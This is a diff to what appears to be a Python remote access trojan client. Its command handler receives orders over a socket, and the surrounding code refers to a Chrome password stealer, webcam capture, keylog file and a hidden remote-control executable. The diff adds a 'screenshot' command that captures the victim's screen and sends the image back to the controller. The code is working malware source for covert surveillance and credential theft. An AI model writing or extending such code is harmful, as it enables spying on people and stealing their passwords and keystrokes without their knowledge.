@@ -19,6 +19,7 @@ PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
 WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
 KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
 REMOTE_EXE= os.path.join(BASE_DIR, "remote.exe")
+SCREENSHOT_EXE = os.path.join(BASE_DIR, "screenshot.exe")
 
 def send_file(client_socket, file_path, file_type):
     try:
@@ -79,8 +80,21 @@ def handle_commands(client_socket):
 
             elif command == "remote":
                 print("[*] remote.exe est lancé !")
+
                 subprocess.Popen([REMOTE_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
                 # subprocess.run([REMOTE_EXE], check=True)
+
+            elif command == "screenshot":
+                subprocess.run([SCREENSHOT_EXE], check=True)
+                capture_folder = os.path.join(BASE_DIR, "screenshot")
+                images = [os.path.join(capture_folder, f) for f in os.listdir(capture_folder) if f.startswith("screenshot_")]
+                if images:
+                    latest = max(images, key=os.path.getctime)
+                    if wait_for_file(latest):
+                        send_file(client_socket, latest, "screenshot")
+
+
+            
 
 
     except Exception as e:
